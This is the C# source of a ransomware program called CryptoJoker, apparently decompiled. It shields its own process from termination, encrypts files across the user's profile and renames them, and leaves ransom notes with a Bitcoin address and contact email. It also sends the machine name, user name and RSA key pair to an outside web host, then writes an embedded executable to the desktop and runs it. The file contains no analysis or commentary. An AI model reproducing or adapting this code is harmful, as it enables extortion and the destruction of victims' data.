using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.IO;
using System.Net;
using System.Runtime.InteropServices;
using System.Security.AccessControl;
using System.Security.Principal;
using System.Text;
using System.Threading;
using CryptoJoker.Properties;

namespace CryptoJoker;

internal class Program
{
	[Flags]
	private enum ProcessAccessRights
	{
		PROCESS_CREATE_PROCESS = 0x80,
		PROCESS_CREATE_THREAD = 2,
		PROCESS_DUP_HANDLE = 0x40,
		PROCESS_QUERY_INFORMATION = 0x400,
		PROCESS_QUERY_LIMITED_INFORMATION = 0x1000,
		PROCESS_SET_INFORMATION = 0x200,
		PROCESS_SET_QUOTA = 0x100,
		PROCESS_SUSPEND_RESUME = 0x800,
		PROCESS_TERMINATE = 1,
		PROCESS_VM_OPERATION = 8,
		PROCESS_VM_READ = 0x10,
		PROCESS_VM_WRITE = 0x20,
		DELETE = 0x10000,
		READ_CONTROL = 0x20000,
		SYNCHRONIZE = 0x100000,
		WRITE_DAC = 0x40000,
		WRITE_OWNER = 0x80000,
		STANDARD_RIGHTS_REQUIRED = 0xF0000,
		PROCESS_ALL_ACCESS = 0x1F0FFF
	}

	[DllImport("advapi32.dll", SetLastError = true)]
	private static extern bool GetKernelObjectSecurity(IntPtr Handle, int securityInformation, [Out] byte[] pSecurityDescriptor, uint nLength, out uint lpnLengthNeeded);

	[DllImport("advapi32.dll", SetLastError = true)]
	private static extern bool SetKernelObjectSecurity(IntPtr Handle, int securityInformation, [In] byte[] pSecurityDescriptor);

	[DllImport("kernel32.dll")]
	public static extern IntPtr GetCurrentProcess();

	private static void Main(string[] args)
	{
		if (JokerIsNotRunning())
		{
			SetAclDenyAll();
			string path = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "jokingwithyou.cryptojoker");
			if (!File.Exists(path))
			{
				RunInfector();
			}
		}
	}

	private static void RunInfector()
	{
		try
		{
			string path = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "d00m.b00m");
			string environmentVariable = Environment.GetEnvironmentVariable("USERPROFILE");
			string path2 = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "e00m.b00m");
			string text = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.Desktop), "b00m.exe");
			string publicKey = string.Empty;
			string publicAndPrivateKey = string.Empty;
			List<string> files = GetFiles(environmentVariable, "*.*");
			CryptoClass cryptoClass = new CryptoClass();
			foreach (string item in files)
			{
				FileInfo fileInfo = new FileInfo(item);
				if (fileInfo.Extension == ".txt" || fileInfo.Extension == ".md")
				{
					try
					{
						cryptoClass.EncryptFileFully(fileInfo.FullName);
						File.Move(fileInfo.FullName, Path.Combine(fileInfo.DirectoryName, fileInfo.Name + ".[rans0me@protonmail.com].b00m"));
					}
					catch (Exception)
					{
					}
				}
				else
				{
					try
					{
						cryptoClass.EncryptFilePartially(fileInfo.FullName);
						File.Move(fileInfo.FullName, Path.Combine(fileInfo.DirectoryName, fileInfo.Name + ".[rans0me@protonmail.com].b00m"));
					}
					catch (Exception)
					{
					}
				}
			}
			cryptoClass.GenerateKeys(1024, out publicKey, out publicAndPrivateKey);
			byte[] bytes = GetBytes(cryptoClass.EncryptionKey);
			bytes = cryptoClass.RsaEncryption(bytes, 1024, publicKey);
			File.WriteAllText(path2, Convert.ToBase64String(bytes));
			using (StreamWriter streamWriter = new StreamWriter(path, append: true))
			{
				streamWriter.WriteLine("Do not delete this file, else the decryption process will be broken.\n All your documents,photos,databases and other important files have been encrypted\n with strongest encryption RSA-2048 key, generated for this computer .\n Private decryption key is stored on a secret internet server and nobody can decrypted\n your files until you pay and obtain the private key.\n Warning :: You only have 2 days to submit $500 USD of payment. If you do not send money within the provided time the price will raise to $1000 USD\n 1) The cost of private key for decrypting your files is 0.047 Bitcoin ( $500 USD ) . \n 2) You can buy bitcoins here : https://localbitcoins.com \n 3) After you pay 0.047 Bitcoin ( $500 USD ) , send an email to rans0me@protonmail.com & ");
			}
			string cryptoJokerMessage = Resources.CryptoJokerMessage;
			cryptoJokerMessage = cryptoJokerMessage.Replace("[HWID goes here]", GetHwid());
			cryptoJokerMessage = cryptoJokerMessage.Replace("[bitcoin address]", "34rLmycSxXQQ7Mhz5qFhkrTrovi3LskKQR");
			File.WriteAllText(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.Desktop), "HACKED.txt"), cryptoJokerMessage, Encoding.Unicode);
			SendEmail(publicAndPrivateKey);
			if (!File.Exists(text))
			{
				File.WriteAllBytes(text, Resources.CryptoJoker);
			}
			Process.Start(text);
		}
		catch (Exception)
		{
		}
	}

	private static void SendEmail(string publicPrivateKey)
	{
		string userName = Environment.UserName;
		string text = Environment.MachineName.ToString();
		string text2 = "http://blackrann.000webhostapp.com/keys.php?info=";
		try
		{
			string text3 = text + "__" + userName + "___" + publicPrivateKey;
			string address = text2 + text3;
			new WebClient().DownloadString(address);
		}
		catch (Exception)
		{
		}
	}

	private static List<string> GetFiles(string path, string pattern)
	{
		List<string> list = new List<string>();
		try
		{
			list.AddRange(Directory.GetFiles(path, pattern, SearchOption.TopDirectoryOnly));
			string[] directories = Directory.GetDirectories(path);
			foreach (string path2 in directories)
			{
				list.AddRange(GetFiles(path2, pattern));
			}
		}
		catch (Exception)
		{
		}
		return list;
	}

	private static void SetAclDenyAll()
	{
		IntPtr currentProcess = GetCurrentProcess();
		RawSecurityDescriptor processSecurityDescriptor = GetProcessSecurityDescriptor(currentProcess);
		processSecurityDescriptor.DiscretionaryAcl!.InsertAce(0, new CommonAce(AceFlags.None, AceQualifier.AccessDenied, 2035711, new SecurityIdentifier(WellKnownSidType.WorldSid, null), isCallback: false, null));
		SetProcessSecurityDescriptor(currentProcess, processSecurityDescriptor);
	}

	private static RawSecurityDescriptor GetProcessSecurityDescriptor(IntPtr processHandle)
	{
		byte[] pSecurityDescriptor = new byte[0];
		GetKernelObjectSecurity(processHandle, 4, pSecurityDescriptor, 0u, out var lpnLengthNeeded);
		if ((long)lpnLengthNeeded > 32767L)
		{
			throw new Win32Exception();
		}
		if (!GetKernelObjectSecurity(processHandle, 4, pSecurityDescriptor = new byte[lpnLengthNeeded], lpnLengthNeeded, out lpnLengthNeeded))
		{
			throw new Win32Exception();
		}
		return new RawSecurityDescriptor(pSecurityDescriptor, 0);
	}

	private static void SetProcessSecurityDescriptor(IntPtr processHandle, RawSecurityDescriptor dacl)
	{
		byte[] array = new byte[dacl.BinaryLength];
		dacl.GetBinaryForm(array, 0);
		if (!SetKernelObjectSecurity(processHandle, 4, array))
		{
			throw new Win32Exception();
		}
	}

	private static string GetHwid()
	{
		UHWIDEngine uHWIDEngine = new UHWIDEngine();
		return uHWIDEngine.SimpleUID;
	}

	private static bool JokerIsNotRunning()
	{
		bool createdNew;
		Mutex obj = new Mutex(initiallyOwned: true, "CryptJokerWalker90912", out createdNew);
		if (!createdNew)
		{
			return false;
		}
		GC.KeepAlive(obj);
		return true;
	}

	private static byte[] GetBytes(string str)
	{
		byte[] array = new byte[str.Length * 2];
		Buffer.BlockCopy(str.ToCharArray(), 0, array, 0, array.Length);
		return array;
	}
}
